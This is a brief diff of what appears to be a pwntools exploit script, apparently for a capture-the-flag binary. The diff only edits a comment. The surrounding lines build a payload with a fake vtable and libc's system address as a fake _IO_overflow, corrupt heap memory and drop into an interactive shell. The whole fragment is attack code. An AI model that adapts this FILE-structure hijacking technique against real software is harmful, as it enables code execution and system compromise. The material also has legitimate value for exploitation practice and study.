@@ -85,7 +85,7 @@ def exploit(p):
 	payload = p64(0) * 6 # padding
 	payload += p64(fake_vtable) # at $rbx+0xd8
 	payload += p64(0) * 6	# padding to _IO_overflow
-	payload += p64(base+libc.symbols['system']) # fake _IO_overflow
+	payload += p64(base+libc.symbols['system']) # fake _IO_overflow = fake_vtable+0x18
 	edit(2, 0, payload)
 	alloc()		# trigger memory corupption
 	p.interactive()
